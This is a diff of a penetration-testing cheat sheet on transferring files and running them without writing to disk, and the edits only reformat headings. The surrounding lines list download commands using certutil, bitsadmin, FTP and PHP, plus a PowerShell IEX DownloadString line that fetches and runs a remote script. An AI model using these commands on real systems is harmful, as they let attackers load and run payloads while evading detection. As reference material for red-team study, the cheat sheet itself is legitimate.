@@ -92,7 +92,7 @@ PS > Invoke-WebRequest https://<ip>[:PORT]/file -UseBasicParsing
 PS > certutil -urlcache -f http://IP:PORT/file file_local
 ```
 >**!! Note:** AMSI detects this as malicious
-### BITSadmin
+## BITSadmin
 ```powershell
 PS > bitsadmin /transfer wcb /priority foreground http://<IP>[:<PORT>]/file <file-to-send>
 ```
@@ -121,7 +121,7 @@ PS > (New-Object Net.WebClient).DownloadFile('ftp://IP[:PORT]/file', 'C:\Users\P
 > echo bye >> ftpcommand.txt
 > ftp -v -n -s:ftpcommand.txt
 ```
-- #fileless-execution
+- fileless execution
 ```powershell
 PS > IEX (New-Object Net.WebClient).DownloadString('https://<IP>[:PORT]/path-to/script.ps1')
 # OR PIPE IT
@@ -217,7 +217,7 @@ fopen() module
 $ php -r 'const BUFFER = 1024; $fremote = 
 fopen("https://address.to/file", "rb"); $flocal = fopen("file", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
 ```
-## Fileless-execution 
+## Fileless Execution 
 > **!! NOTE:** Some payloads such as `mkfifo` write files to disk. But while the execution of the payload may be fileless with pipes, depending on the payload chosen it may create temporary files on the OS.
 
 - **cURL**
